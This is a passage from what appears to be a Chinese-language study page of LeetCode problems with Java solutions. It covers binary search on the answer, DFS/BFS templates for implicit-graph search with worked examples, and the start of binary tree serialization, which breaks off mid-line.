frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n一个正整数如果能被 a 或 b 整除，那么它是神奇的。\n\n给定三个整数 n , a , b ，返回第 n 个神奇的数字。因为答案可能很大，所以返回答案 对 109 + 7 取模 后的值。\n\n示例 1：\n```txt\n输入：n = 1, a = 2, b = 3\n输出：2\n```\n\n示例 2：\n```txt\n输入：n = 4, a = 2, b = 3\n输出：6\n```\n\n###### 题目分析\n1. 这一堆objects就是a与b的神奇数字\n2. 属性：神奇数字大小\n3. 所有可能解是`[0, n * Math.min(a, b)]`;\n4. `boolean f(v)`是将objects排好序后，如果大小小于value的个数大于等于k，则返回true，反之，返回false\n\n代码：\n```java\nclass Solution {\n  public int nthMagicalNumber(int n, int a, int b) {\n    return binarySearch(0, (long)n * Math.min(a, b), n, a, b);\n  }\n  \n  int binarySearch(long left, long right, int n, int a, int b) {\n    while (left + 1 != right) {\n      long mid = left + (right - left) / 2;\n      if (f(n, a, b, mid)) {\n        right = mid;\n      } else {\n        left = mid;\n      }\n    }\n    return (int)(right % (1e9 + 7));\n  }\n\n  // 如果a与b的神奇数字小于value的个数大于或等于n，则返回true，反之返回false\n  boolean f(int n, int a, int b, long value) {\n    return value / a + value / b - value / lcm(a, b) >= n;\n  }\n\n  int gcd(int a, int b) {\n    // 辗转相除\n    return b ==0 ? a : gcd(b, a % b);\n  }\n  \n  int lcm(int a, int b) {\n    return a * b / gcd(a, b);\n  }\n}\n```\n\n##### 例题9: 找出第 K 小的数对距离\n[找出第 K 小的数对距离](https://leetcode.cn/problems/find-k-th-smallest-pair-distance/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220603211022.png)\n\n##### 分析\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/2YtgPABdeHE\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n代码：\n```java\nclass Solution {\n  int[] nums;\n  public int smallestDistancePair(int[] nums, int k) {\n    this.nums = nums;\n    Arrays.sort(this.nums);\n    int res = binearySearch(-1, 1000001, k);\n    return res;\n  }\n  \n  // 如果数组中对距离小于value的个数大于或等于k，则返回true，反之返回false\n  boolean f(int value, int k) {\n    int cnt = 0;\n    int rloc = 0;\n    for (int i = 0; i < nums.length; i++) {\n      while (rloc < nums.length && nums[rloc] - nums[i] <= value) {\n         rloc++;\n      }\n      cnt += rloc - i - 1;\n    }\n    return cnt >= k;\n  }\n\n  int binearySearch(int left, int right, int k) {\n    while (left + 1 != right) {\n      int mid = left + (right - left) / 2;\n      if (f(mid, k)) {\n        right = mid; \n      } else {\n        left = mid;\n      }\n    }\n    return right;\n  }\n  \n}\n```\n\n##### 例题10: 有序矩阵中第 K 小的元素\n[有序矩阵中第 K 小的元素](https://leetcode.cn/problems/kth-smallest-element-in-a-sorted-matrix/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220604100441.png)\n\n代码：\n```java\nclass Solution {\n  int[][] matrix;\n  public int kthSmallest(int[][] matrix, int k) {\n    this.matrix = matrix;\n    return binearySearch((int)-1e9, (int)1e9+1, k);\n  }\n\n  boolean f(int value, int k) {\n    int cnt = 0;\n    for (int r = 0; r < matrix.length; r++) {\n      for (int c = 0; c < matrix[0].length; c++) {\n        if (matrix[r][c] > value) {\n          break;\n        }\n        cnt++;\n      }\n    }\n    return cnt >= k;\n  }\n\n  int binearySearch(int left, int right, int k) {\n    while (left + 1 != right) {\n      int mid = left + (right - left) / 2;\n      if (f(mid, k)) {\n        right = mid;\n      } else {\n        left = mid;\n      }\n    }\n    return right;\n  }\n\n}\n```\n\n## 隐式图上的DFS和BFS算法\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/g9SOQIKspaw\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/xdmyuHKsTYU\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n<div class=\"container\">\n  <iframe src=\"https://drive.google.com/file/d/179HorlJSGlAwA-c-FV6b-JsYovjfpjb9/preview\" width=\"640\" height=\"480\" allow=\"autoplay\"></iframe>\n</div>\n\n### 模版\n\n#### DFS模版\n```java\n/**\n* visited: 用来存储被访问过的状态。如果允许状态是能够重复访问，则不需要创建visited变量\n* path: 用来存储路径。如果不需要输出路径，则不需要创建path变量\n* return: 是否可以到达目标状态\n*/\nboolean dfs(State currentState, Map<State, Boolean> visited, LinkedList<State> path) {\n  visited.put(currentState, true);\n  \n  // 如果currentState是目标状态\n  if (isObjective(currentState)) {\n    // 可以在这里输出path\n    return true;\n  }\n\n  // 获取当前状态可以转换到的所有下一个状态。此时不需要考虑这个状态是否能被添加到队列中\n  List<State> nextStates = transition(currentState);\n\n  for (State nextState : nextStates) {\n    if (visited.containsKey(nextState)) continue;\n    path.push(nextState);\n    if (dfs(nextState, visited, path)){\n      return true;\n    }\n    path.pop();\n  }\n  return false;\n}\n```\n\n#### BFS模版\n##### 模版1：求路径是否存在\n```java\n/**\n* visited: 用来存储被访问过的状态。如果允许状态是能够重复访问，则不需要创建visited变量\n* path: 用来存储路径。如果不需要输出路径，则不需要创建path变量\n* return: 是否可以到达目标状态\n*/\nboolean bfs(State startState) {\n  Queue<State> queue = new LinkedList();\n  Map<State, Boolean> visited = new HashMap();\n  Map<State, State> path = new HashMap();\n  \n  queue.add(startState);\n  visited.put(startState, true);\n\n  while (!queue.isEmpty()) {\n    State currentState = queue.poll();\n    // 如果currentState是目标状态\n    if (isObjective(currentState)) {\n      // 可以在这里输出path\n      return visited.get(currentState);\n    }\n\n    // 获取当前状态可以转换到的所有下一个状态。此时不需要考虑这个状态是否能被添加到队列中\n    List<State> nextStates = transition(currentState);\n\n    for (State nextState : nextStates) {\n      if (visited.containsKey(nextState)) continue;\n      queue.add(nextState);\n      visited.put(nextState, true);\n      path.put(nextState, currentState); \n    }\n  }\n  return false;\n}\n```\n\n##### 模版2：求最短路径\n```java\n/**\n* visited: 用来存储被访问过的状态。如果允许状态是能够重复访问，则不需要创建visited变量\n* path: 用来存储路径。如果不需要输出路径，则不需要创建path变量\n*/\nboolean bfs(State startState) {\n  Queue<State> queue = new LinkedList();\n  Map<State, Integer> visited = new HashMap();\n  Map<State, State> path = new HashMap();\n  \n  queue.add(startState);\n  visited.put(startState, true);\n\n  while (!queue.isEmpty()) {\n    State currentState = queue.poll();\n    // 如果currentState是目标状态\n    if (isObjective(currentState)) {\n      // 可以在这里输出path\n      return true;\n    }\n\n    // 获取当前状态可以转换到的所有下一个状态。此时不需要考虑下一个状态是否被访问过\n    List<State> nextStates = transition(currentState);\n    for (State nextState : nextStates) {\n      if (visited.containsKey(nextState)) continue;\n      queue.add(nextState);\n      visited.put(nextState, visited.get(currentState) + 1);\n      path.put(nextState, currentState); \n    }\n  }\n  return false;\n}\n```\n\n###### visited妙用\n用BFS求最短路径时visited不但可以用来存储被访问过的状态，还可以用来存储到达此状态的最短路径。见例题2: 完全平方数、例题4: 滑动谜题、例题5: 零钱兑换\n\n### 总结\n使用模版前，需要思考下面2点：\n1. 是否允许状态被重复访问?\n  - 允许，不需要创建visited。见例题3：N皇后 II\n  - 不允许，需要创建visited\n2. 是否要求出最短路径?\n  - 是，推荐使用BFS。由于DFS复杂度高，所以不推荐使用。见例题2: 完全平方数\n  - 不是，既能使用BFS，也能使用DFS\n\n### 例题\n#### 例题1: 水壶问题\n[水壶问题](https://leetcode.cn/problems/water-and-jug-problem/)\n\n有两个水壶，容量分别为 jug1Capacity 和 jug2Capacity 升。水的供应是无限的。确定是否有可能使用这两个壶准确得到 targetCapacity 升。\n\n如果可以得到 targetCapacity 升水，最后请用以上水壶中的一或两个来盛放取得的 targetCapacity 升水。\n\n你可以：\n- 装满任意一个水壶\n- 清空任意一个水壶\n- 从一个水壶向另外一个水壶倒水，直到装满或者倒空\n\n示例 1: \n```txt\n输入: jug1Capacity = 3, jug2Capacity = 5, targetCapacity = 4\n输出: true\n```\n\n示例 2:\n```\n输入: jug1Capacity = 2, jug2Capacity = 6, targetCapacity = 5\n输出: false\n```\n\n代码：\nDFS实现\n```java\nclass Solution {\n  int jug1 = 0;\n  int jug2 = 0;\n  int target = 0;\n\n  public boolean canMeasureWater(int jug1Capacity, int jug2Capacity, int targetCapacity) {\n    jug1 = jug1Capacity;\n    jug2 = jug2Capacity;\n    target = targetCapacity;\n    return dfs(new State(0, 0), new HashMap());\n  }\n\n  boolean dfs(State currentState, Map<State, Boolean> visited) {\n    visited.put(currentState, true);\n\n    if (currentState.x == target || \n    currentState.y == target || \n    currentState.x + currentState.y == target) {\n      return true;\n    }\n\n    List<State> nextStates = transition(currentState);\n    for (State nextState : nextStates) {\n      if (visited.containsKey(nextState)) continue;\n      if (dfs(nextState, visited)){\n        return true;\n      }\n    }\n    return false;\n  }\n\n  List<State> transition(State state) {\n    List<State> res = new ArrayList();\n    if (state.x < jug1) {\n      res.add(new State(jug1, state.y)); // 把第一个壶倒满\n    }\n    if (state.y < jug2) {\n      res.add(new State(state.x, jug2)); // 把第二个壶倒满\n    }\n    if (state.x > 0) {\n      res.add(new State(0, state.y)); // 清空第一个壶\n    }\n    if (state.y > 0) {\n      res.add(new State(state.x, 0)); // 清空第二个壶\n    }\n    if (state.x < jug1 && state.y > 0) {\n      res.add(new State(Math.min(jug1, state.x + state.y), Math.max(0, state.y - (jug1 - state.x)))); // 将第二个壶中的水倒入第一个壶中\n    }\n    if (state.y < jug2 && state.x > 0) {\n      res.add(new State(Math.max(0, state.x - (jug2 - state.y)), Math.min(jug2, state.y + state.x))); // 将第一个壶中的水倒入第二个壶中\n    }\n    return res;\n  }\n\n  class State {\n    int x;\n    int y;\n\n    public State(int x, int y) {\n      this.x = x; \n      this.y = y;\n    }\n\n    public boolean equals(Object o) {\n      if (this == o) return true;\n      if (o == null) return false;\n      State a = (State) o;\n      return x == a.x && y == a.y;\n    }\n\n    public int hashCode() {\n      return Objects.hash(x, y);\n    } \n\n  }\n\n}\n```\n\nBFS实现\n```java\nclass Solution {\n  int jug1 = 0;\n  int jug2 = 0;\n  int target = 0;\n\n  public boolean canMeasureWater(int jug1Capacity, int jug2Capacity, int targetCapacity) {\n    jug1 = jug1Capacity;\n    jug2 = jug2Capacity;\n    target = targetCapacity;\n    return bfs(new State(0, 0));\n  }\n\n  boolean bfs(State startState) {\n    Queue<State> queue = new LinkedList();\n    Map<State, Boolean> visited = new HashMap();\n    Map<State, State> path = new HashMap();\n    \n    queue.add(startState);\n    visited.put(startState, true);\n\n    while (!queue.isEmpty()) {\n      State currentState = queue.poll();\n      if (currentState.x == target || \n        currentState.y == target || \n        currentState.x + currentState.y == target) {\n      return true;\n      }\n\n      List<State> nextStates = transition(currentState);\n      for (State nextState : nextStates) {\n        if (visited.containsKey(nextState)) continue;\n        queue.add(nextState);\n        visited.put(nextState, true);\n        path.put(nextState, currentState); \n      }\n    }\n    return false;\n\n  }\n\n  List<State> transition(State state) {\n    List<State> res = new ArrayList();\n    if (state.x < jug1) {\n      res.add(new State(jug1, state.y)); // 把第一个壶倒满\n    }\n    if (state.y < jug2) {\n      res.add(new State(state.x, jug2)); // 把第二个壶倒满\n    }\n    if (state.x > 0) {\n      res.add(new State(0, state.y)); // 清空第一个壶\n    }\n    if (state.y > 0) {\n      res.add(new State(state.x, 0)); // 清空第二个壶\n    }\n    if (state.x < jug1 && state.y > 0) {\n      res.add(new State(Math.min(jug1, state.x + state.y), Math.max(0, state.y - (jug1 - state.x)))); // 将第二个壶中的水倒入第一个壶中\n    }\n    if (state.y < jug2 && state.x > 0) {\n      res.add(new State(Math.max(0, state.x - (jug2 - state.y)), Math.min(jug2, state.y + state.x))); // 将第一个壶中的水倒入第二个壶中\n    }\n    return res;\n  }\n\n  class State {\n    int x;\n    int y;\n\n    public State(int x, int y) {\n      this.x = x; \n      this.y = y;\n    }\n\n    public boolean equals(Object o) {\n      if (this == o) return true;\n      if (o == null) return false;\n      State a = (State) o;\n      return x == a.x && y == a.y;\n    }\n\n    public int hashCode() {\n      return Objects.hash(x, y);\n    } \n\n  }\n\n}\n```\n\n#### 例题2: 完全平方数\n\n[完全平方数](https://leetcode.cn/problems/perfect-squares/)\n\n给你一个整数 n ，返回 和为 n 的完全平方数的最少数量 。\n\n完全平方数 是一个整数，其值等于另一个整数的平方；换句话说，其值等于一个整数自乘的积。例如，1、4、9 和 16 都是完全平方数，而 3 和 11 不是。\n\n示例 1：\n```txt\n输入：n = 12\n输出：3 \n解释：12 = 4 + 4 + 4\n```\n\n示例 2：\n```txt\n输入：n = 13\n输出：2\n解释：13 = 4 + 9\n```\n\n##### 分析\n此题是最短路径问题，可以用BFS来做，但是不能用DFS来做\n\n代码：\n```java\nclass Solution {\n  public int numSquares(int n) {\n    return bfs(n);    \n  }\n  \n  int bfs(Integer startState) {\n    Queue<Integer> queue = new LinkedList(); \n    Map<Integer, Integer> visited = new HashMap(); // 技巧： 可以用visited表示是否被访问过，也表示访问此状态所经过的步数\n\n    queue.add(startState);\n    visited.put(startState, 0);\n    \n    while(!queue.isEmpty()) {\n      Integer currentState = queue.poll();\n      if (currentState == 0) {\n        return visited.get(currentState);\n      }\n\n      List<Integer> nextStates = new ArrayList();\n      for (int i = 1; i * i <= currentState; i++) {\n        nextStates.add(currentState - i * i); \n      }\n      for (Integer nextState : nextStates) {\n        if (visited.containsKey(nextState)) continue;;\n        queue.add(nextState);\n        visited.put(nextState, visited.get(currentState) + 1);\n      }  \n    }\n    return -1;\n  }\n}\n```\n\n\n#### 例题3：N皇后 II\n[N皇后 II](https://leetcode.cn/problems/n-queens-ii/)\n\nn 皇后问题 研究的是如何将 n 个皇后放置在 n × n 的棋盘上，并且使皇后彼此之间不能相互攻击。\n\n给你一个整数 n ，返回 n 皇后问题 不同的解决方案的数量。\n\n示例 1：\n```txt\n输入：n = 4\n输出：2\n```\n\n##### 分析\nDFS代码：\n```java\nclass Solution {\n\n  int n; \n  int cnt = 0; \n\n  public int totalNQueens(int n) {\n    this.n = n;\n    dfs(new State(new int[9], 0));\n    return cnt;\n  }\n  \n  void dfs(State currentState) {\n    if (currentState.nowRow == n) {\n      cnt++;\n      return;\n    }\n\n    List<State> nextStates = new ArrayList();\n    for (int col = 0; col < n; col++) {\n      boolean conflict = false;\n      for (int row = 0; row < currentState.nowRow; row++) {\n        if (col == currentState.preRows[row] || currentState.nowRow - row  == Math.abs(currentState.preRows[row] - col)) {\n          conflict = true; \n          break;\n        }\n      }\n      if (!conflict) {\n        int[] temp =  Arrays.copyOf(currentState.preRows, n);\n        temp[currentState.nowRow] = col; \n        nextStates.add(new State(temp,  currentState.nowRow + 1));\n      }\n    }\n    \n    for (State nextState : nextStates) {\n      dfs(nextState);\n    }\n\n  }\n\n  class State {\n    int[] preRows; // 存放位于nowRow前面的每行中皇后所在列\n    int nowRow; // 当前需要摆放皇后的行\n\n    public State(int[] preRows, int nowRow) {\n      this.preRows = preRows;\n      this.nowRow = nowRow;\n    }\n\n\n    public boolean equals(Object o) {\n      if (this == o) return true;\n      if (o == null || getClass() != o.getClass()) return false;\n      State state = (State) o;\n      return nowRow == state.nowRow && Arrays.equals(preRows, state.preRows);\n    }\n  \n    public int hashCode() {\n      int result = Objects.hash(nowRow);\n      result = 31 * result + Arrays.hashCode(preRows);\n      return result;\n    }\n  }\n\n}\n```\n\nBFS代码：\n```java\nclass Solution {\n\n  int n; \n  int cnt = 0; \n\n  public int totalNQueens(int n) {\n    this.n = n;\n    //dfs(new State(new int[9], 0));\n    bfs(new State(new int[9], 0));\n    return cnt;\n  }\n\n  void bfs(State startState) {\n    Queue<State> queue = new LinkedList();\n    queue.add(startState);\n\n    while(!queue.isEmpty()) {\n      State currentState = queue.poll();\n\n      if (currentState.nowRow == n) {\n        cnt++;\n        continue;\n      }\n\n      List<State> nextStates = new ArrayList();\n      for (int col = 0; col < n; col++) {\n        boolean conflict = false;\n        for (int row = 0; row < currentState.nowRow; row++) {\n          if (col == currentState.preRows[row] || currentState.nowRow - row  == Math.abs(currentState.preRows[row] - col)) {\n            conflict = true; \n            break;\n          }\n        }\n\n        if (!conflict) {\n          int[] temp =  Arrays.copyOf(currentState.preRows, n);\n          temp[currentState.nowRow] = col; \n          nextStates.add(new State(temp,  currentState.nowRow + 1));\n        }\n      }\n\n      for (State nextState : nextStates) {\n        queue.add(nextState); \n      }\n    }\n  }\n\n  class State {\n    int[] preRows; // 存放位于nowRow前面的每行中皇后所在列\n    int nowRow; // 当前需要摆放皇后的行\n\n    public State(int[] preRows, int nowRow) {\n      this.preRows = preRows;\n      this.nowRow = nowRow;\n    }\n\n\n    public boolean equals(Object o) {\n      if (this == o) return true;\n      if (o == null || getClass() != o.getClass()) return false;\n      State state = (State) o;\n      return nowRow == state.nowRow && Arrays.equals(preRows, state.preRows);\n    }\n  \n    public int hashCode() {\n      int result = Objects.hash(nowRow);\n      result = 31 * result + Arrays.hashCode(preRows);\n      return result;\n    }\n  }\n\n}\n```\n\n##### 判断棋盘中的两个点是否在同一斜线上\n假如现在有两个点(x1, y1), (x2, y2); 则其两个在同一斜线上点充要条件是：$abs(x1 - x2) == abs(y1 - y2)$\n\n#### 例题4: 滑动谜题\n[滑动谜题](https://leetcode.cn/problems/sliding-puzzle/)\n\n在一个 2 x 3 的板上（board）有 5 块砖瓦，用数字 1~5 来表示, 以及一块空缺用 0 来表示。一次 移动 定义为选择 0 与一个相邻的数字（上下左右）进行交换.\n\n最终当板 board 的结果是 [[1,2,3],[4,5,0]] 谜板被解开。\n\n给出一个谜板的初始状态 board ，返回最少可以通过多少次移动解开谜板，如果不能解开谜板，则返回 -1 。\n\n#### 分析\n\n代码:\n```java\nclass Solution {\n\n  public int slidingPuzzle(int[][] board) {\n    return bfs(new State(board)); \n  }\n\n  int bfs(State startState) {\n    Queue<State> queue = new LinkedList();\n    Map<State, Integer> visited = new HashMap();\n\n    queue.add(startState);\n    visited.put(startState, 0);\n\n    while (!queue.isEmpty()) {\n      State currentState = queue.poll();\n      if (Arrays.deepEquals(currentState.board, new int[][]{ {1,2,3}, {4,5,0} })) {\n        return visited.get(currentState);\n      }\n\n      List<State> nextStates = transition(currentState);\n      for(State nextState : nextStates) {\n        if (visited.containsKey(nextState)) continue;    \n        queue.add(nextState);\n        visited.put(nextState, visited.get(currentState) + 1);\n      }\n    }\n    return -1;\n  }\n\n  List<State> transition(State currentState) {\n    int[] now = currentState.now;\n    int[][] board = currentState.board;\n    List<State> res = new ArrayList();\n    int[] dc = new int[]{0, 0, -1, 1};\n    int[] dr = new int[]{-1, 1, 0, 0};\n    for (int i = 0; i < 4; i++) {\n      int nr = now[0] + dr[i];\n      int nc = now[1] + dc[i];\n      if (nr >= 0 && nr <= 1 && nc >= 0 && nc <= 2) {\n        int[][] newBoard = new int[2][3];\n        for (int j = 0; j < 2; j++) {\n          newBoard[j] = Arrays.copyOf(board[j], 3);\n        }\n        newBoard[now[0]][now[1]] = newBoard[nr][nc];\n        newBoard[nr][nc] = 0;\n        res.add(new State(newBoard, new int[]{nr, nc}));\n      }\n    }\n    return res;\n  }\n\n  class State {\n    int[][] board = new int[2][3];\n    int[] now; // 现在空缺块坐标\n\n    public State(int[][] board, int[] now) {\n      this.board = board;\n      this.now = now;\n    }\n\n    public State(int[][] board) {\n      this.board = board;\n      for (int r = 0; r < 2; r++) {\n        for (int c = 0; c < 3; c++) {\n          if (board[r][c] == 0) {\n            this.now = new int[]{r, c};\n            return;\n          }\n        }\n      }\n    }\n\n    @Override\n    public boolean equals(Object o) {\n      if (this == o) return true;\n      if (o == null || getClass() != o.getClass()) return false;\n      State state = (State) o;\n      return Arrays.deepEquals(board, state.board) && Arrays.equals(now, state.now);\n    }\n\n    @Override\n    public int hashCode() {\n      int result = Arrays.deepHashCode(board);\n      result = 31 * result + Arrays.hashCode(now);\n      return result;\n    }\n\n  }\n \n}\n```\n\n#### 例题5: 零钱兑换\n[零钱兑换](https://leetcode.cn/problems/coin-change/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220711103547.png)\n\n代码：\n```java\nclass Solution {\n  int[] coins;\n\n  public int coinChange(int[] coins, int amount) {\n    this.coins = coins; \n    return bfs(amount); \n  }\n\n  int bfs(int startState) {\n    Queue<Integer> queue = new LinkedList();\n    Map<Integer, Integer> visited = new HashMap();\n    queue.add(startState);\n    visited.put(startState, 0); \n    \n    while(!queue.isEmpty()) {\n      Integer currentState = queue.poll();\n      if (currentState == 0) {\n        return visited.get(currentState);\n      }\n\n      List<Integer> nextStates = new ArrayList(); \n      for (int coin : coins) {\n        int temp = currentState - coin;\n        if (temp >= 0) {\n          nextStates.add(temp); \n        }\n      }\n      for (Integer nextState : nextStates) {\n        if (visited.containsKey(nextState)) continue;\n        queue.add(nextState);\n        visited.put(nextState, visited.get(currentState) + 1);\n      } \n    }\n    return -1;\n  }\n}\n```\n\n#### 例题6: 跳跃游戏 III\n[跳跃游戏 III](https://leetcode.cn/problems/jump-game-iii/)\n\n这里有一个非负整数数组 arr，你最开始位于该数组的起始下标 start 处。当你位于下标 i 处时，你可以跳到 i + arr[i] 或者 i - arr[i]。\n\n请你判断自己是否能够跳到对应元素值为 0 的 任一 下标处。\n\n注意，不管是什么情况下，你都无法跳到数组之外。\n\n示例 1：\n```txt\n输入：arr = [4,2,3,0,3,1,2], start = 5\n输出：true\n解释：\n到达值为 0 的下标 3 有以下可能方案： \n下标 5 -> 下标 4 -> 下标 1 -> 下标 3 \n下标 5 -> 下标 6 -> 下标 4 -> 下标 1 -> 下标 3 \n```\n\n示例 2：\n```txt\n输入：arr = [4,2,3,0,3,1,2], start = 0\n输出：true \n解释：\n到达值为 0 的下标 3 有以下可能方案： \n下标 0 -> 下标 4 -> 下标 1 -> 下标 3\n```\n\n##### 分析\nBFS代码：\n```java\nclass Solution {\n  int[] arr;\n\n  public boolean canReach(int[] arr, int start) {\n    this.arr = arr;\n    return bfs(start); \n  }\n\n  boolean bfs(Integer startState) {\n    Queue<Integer> queue = new LinkedList();\n    Map<Integer, Boolean> visited = new HashMap();\n    \n    queue.add(startState);\n    visited.put(startState, true); \n\n    while (!queue.isEmpty()) {\n      Integer currentState = queue.poll();\n      if (arr[currentState] == 0) {\n        return true; \n      }\n\n      List<Integer> nextStates = new ArrayList();  \n      for (int i : new int[]{currentState + arr[currentState], currentState - arr[currentState]}) {\n        if (i < arr.length && i >= 0) {\n          nextStates.add(i);\n        }\n      }\n\n      for (Integer nextState : nextStates) {\n        if (visited.containsKey(nextState)) continue;\n        queue.add(nextState);\n        visited.put(nextState, true);\n      }\n    }\n    return false;\n  }\n}\n```\n\nDFS代码：\n```java\nclass Solution {\n  int[] arr;\n  int start;\n\n  public boolean canReach(int[] arr, int start) {\n    this.arr = arr;\n    return dfs(start, new HashMap()); \n  }\n\n  boolean dfs(Integer currentState, Map<Integer, Boolean> visited) {\n    visited.put(currentState, true);\n    \n    if (arr[currentState] == 0) {\n      return true;\n    }\n\n    List<Integer> nextStates = new ArrayList();  \n    for (int i : new int[]{currentState + arr[currentState], currentState - arr[currentState]}) {\n      if (i < arr.length && i >= 0) {\n        nextStates.add(i);\n      }\n    }\n\n    for (Integer nextState : nextStates) {\n      if (nextState >= arr.length || nextState < 0 || visited.containsKey(nextState)) continue;\n      if (dfs(nextState, visited)) {\n        return true;\n      }\n    }\n    return false;\n  }\n}\n```\n\n#### 例题7: 被围绕的区域\n[被围绕的区域](https://leetcode.cn/problems/surrounded-regions/)\n\n给你一个 m x n 的矩阵 board ，由若干字符 'X' 和 'O' ，找到所有被 'X' 围绕的区域，并将这些区域里所有的 'O' 用 'X' 填充。\n\n##### 分析\nBFS代码：\n```java\nclass Solution {\n\n  int row;\n  int col;\n  int[] dr = new int[]{-1, 1, 0, 0};\n\tint[] dc = new int[]{0, 0, -1, 1};\n  char[][] board;\n  Map<State, Boolean> visited = new HashMap();\n  List<State> change = new LinkedList();\n  List<State> tempChange = new LinkedList();\n  boolean flag = true; // 用来标记当前连通块是否被‘x’围绕\n  \n  public void solve(char[][] board) {\n    this.board = board;\n    row = board.length;\n    col = board[0].length;\n    for (int r = 0; r < row; r++) {\n      for (int c = 0; c < col; c++) {\n        State state = new State(new int[]{r, c});\n        if (board[r][c] == 'O' && !visited.containsKey(state)) {\n          tempChange = new LinkedList();\n          flag = true;\n          bfs(state);\n          if (flag) {\n            change.addAll(tempChange);\n          }\n        }\n      }\n    } \n\n    for (State state : change) {\n      board[state.coor[0]][state.coor[1]] = 'X';\n    }\n\n  }\n  \n  void bfs(State startState) {\n    Queue<State> queue = new LinkedList();\n    queue.add(startState); \n    visited.put(startState, true);\n    tempChange.add(startState);\n\n    while (!queue.isEmpty()) {\n      State currentState = queue.poll();\n\n      List<State> nextStates = new ArrayList();\n      for (int i = 0; i < 4; i++) {\n        int nr = currentState.coor[0] + dr[i];\n        int nc = currentState.coor[1] + dc[i];\n        if (nr < 0 || nr >= row || nc < 0 || nc >= col) {\n          flag = false;  // 当前连通块没有被‘x’围绕\n        } else if (board[nr][nc] == 'O'){\n          nextStates.add(new State(new int[]{nr, nc}));\n        }\n      }\n      for (State nextState : nextStates) {\n        if (visited.containsKey(nextState)) continue;\n        queue.add(nextState);\n        visited.put(nextState, true);\n        tempChange.add(nextState);\n      }\n    }\n\n  }\n\n  class State {\n    int[] coor;\n\n    public State(int[] coor) {\n      this.coor = coor;\n    }\n\n    @Override\n    public boolean equals(Object o) {\n      if (this == o) return true;\n      if (o == null || getClass() != o.getClass()) return false;\n      State state = (State) o;\n      return Arrays.equals(coor, state.coor);\n    }\n\n    @Override\n    public int hashCode() {\n      return Arrays.hashCode(coor);\n    }\n  }\n\n}\n```\n\nDFS代码：\n```java\nclass Solution {\n\n  int row;\n  int col;\n  int[] dr = new int[]{-1, 1, 0, 0};\n\tint[] dc = new int[]{0, 0, -1, 1};\n  char[][] board;\n  Map<State, Boolean> visited = new HashMap();\n  List<State> change = new LinkedList();\n  List<State> tempChange = new LinkedList();\n  boolean flag = true; // 用来标记当前连通块是否被‘x’围绕\n  \n  public void solve(char[][] board) {\n    this.board = board;\n    row = board.length;\n    col = board[0].length;\n    for (int r = 0; r < row; r++) {\n      for (int c = 0; c < col; c++) {\n        State state = new State(new int[]{r, c});\n        if (board[r][c] == 'O' && !visited.containsKey(state)) {\n          tempChange = new LinkedList();\n          flag = true;\n          dfs(state);\n          if (flag) {\n            change.addAll(tempChange);\n          }\n        }\n      }\n    } \n\n    for (State state : change) {\n      board[state.coor[0]][state.coor[1]] = 'X';\n    }\n\n  }\n  \n\n  void dfs(State currentState) {\n    visited.put(currentState, true);\n    tempChange.add(currentState);\n\n    List<State> nextStates = new ArrayList();\n    for (int i = 0; i < 4; i++) {\n      int nr = currentState.coor[0] + dr[i];\n      int nc = currentState.coor[1] + dc[i];\n      if (nr < 0 || nr >= row || nc < 0 || nc >= col) {\n        flag = false;  // 当前连通块没有被‘x’围绕\n      } else if (board[nr][nc] == 'O'){\n        nextStates.add(new State(new int[]{nr, nc}));\n      }\n    }\n\n    for (State nextState : nextStates) {\n      if (visited.containsKey(nextState)) continue;\n      dfs(nextState);\n    }\n  }\n  \n  class State {\n    int[] coor;\n\n    public State(int[] coor) {\n      this.coor = coor;\n    }\n\n    @Override\n    public boolean equals(Object o) {\n      if (this == o) return true;\n      if (o == null || getClass() != o.getClass()) return false;\n      State state = (State) o;\n      return Arrays.equals(coor, state.coor);\n    }\n\n    @Override\n    public int hashCode() {\n      return Arrays.hashCode(coor);\n    }\n  }\n\n}\n```\n\n# 树\n## 结构转换+序列化\n### 例题1: 二叉树的序列化与反序列化\n[二叉树的序列化与反序列化](https://leetcode.cn/problems/serialize-and-deserialize-binary-tree/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220726151612.png)\n\n#### 方法一：中序遍历\n```java\n/**\n * Definition for a binary tree node.\n * public class TreeNode {\n *     int val;\n *     TreeNode left;\n *     TreeNode right;\n *     TreeNode(int x) { val = x; }\n * }\n */\npublic class Codec {\n\n  // Encodes a tree to a single string.\n  public String serialize(TreeNode root) {\n    if (root == null) return \"\";\n    StringBuffer sb = new StringBuffer();\n    Queue<TreeNode> queue = new LinkedList();\n    queue.add(root);\n    sb.append(root.val + \",\");\n\n    while (!queue.isEmpty()) {\n      TreeNode currentNode = queue.poll();\n      if (currentNode.left != null) {\n        queue.add(currentNode.left);\n        sb.append(currentNode.left.val + \",\"); \n      } else {\n        sb.append(\"null,\");\n      }\n      if (currentNode.right != null) {\n        queue.add(currentNode.right);\n        sb.append(currentNode.right.val + \",\");\n      } else {\n        sb.append(\"null,\");\n      }\n    }\n    return sb.toString();\n  }\n\n  // Decodes your encoded data to tree.\n  public TreeNode deserialize(String data) {\n    if (data.equals(\"\")) return null;\n    String[] nodes = data.split(\",\");\n    Queue<TreeNode> queue = new LinkedList();\n    TreeNode root = new TreeNode(Integer.valueOf(nodes[0]));\n    queue.add(root);\n    int i = 0;\n    while (!queue.isEmpty()) {\n      TreeNode currentNode = queue.poll();\n      TreeNode child = nodes[++i].equals(\"null\") ? null : new TreeNode(Integer.valueOf(nodes[i]));\n      if (child != null) {\n        queue.add(child);\n      }\n      currentNode.left = child;\n      child = nodes[++i].equals(\"null\") ? null : new 